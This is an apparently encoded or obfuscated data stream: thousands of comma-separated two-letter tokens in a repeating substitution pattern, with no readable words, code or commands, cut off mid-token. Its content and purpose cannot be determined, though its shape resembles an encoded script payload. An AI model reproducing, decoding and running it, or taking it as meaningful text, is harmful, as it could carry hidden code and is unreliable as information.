f,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,NW,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,xv,NW,Mb,ff,RV,xv,NW,xv,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,it,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,x